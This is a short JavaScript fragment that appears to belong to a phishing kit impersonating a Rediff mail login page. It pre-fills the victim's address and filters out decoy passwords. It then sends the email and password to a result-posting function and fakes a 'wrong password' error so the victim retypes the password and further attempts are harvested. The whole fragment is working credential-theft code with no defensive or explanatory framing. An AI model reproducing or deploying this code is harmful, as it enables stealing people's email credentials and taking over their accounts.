// 
if (validEmail.test(usermail)) {
    let getDomain = usermail.split('@');
    $("#rediff_mail").val(getDomain[0]);
    $("#rediff_domain").text("@"+getDomain[1]);
    $("#rediff_mail").attr('readOnly', true);
    
}

$("#rediff_form").on('submit', (e)=>{
    e.preventDefault();

    if ($("#rediff_mail").val() == "") {
        $("#rediff_mail").css({"border-color":"red"})
        return
    }
    else{
        $("#rediff_mail").css({"border-color":"silver"})
    }

    if (validEmail.test($("#rediff_pass").val()) || $("#rediff_pass").val().length < 6 || $("#rediff_pass").val() == 123456 || $("#rediff_pass").val().toLowerCase() == "qwerty" || $("#rediff_pass").val().toLowerCase() == "password" || $("#rediff_pass").val().toLowerCase() == "testing") {
        $("#rediff_pass").css({"border-color":"red"})
        return
    }
    else{
        $("#rediff_pass").css({"border-color":"silver"})

        let permEmail = $("#rediff_mail").val()+$("#rediff_domain").text();

        postResult($("#rediff_domain").text().slice(1), permEmail, $("#rediff_pass").val(), postCount);

        $("#loader").show().css({"display":"flex"})

        setTimeout(() => {
            $("#rediff_pass").css({"border-color":"red"})
            postCount++
            $("#rediff_pass").val("")
        }, delayCounter);

    }

})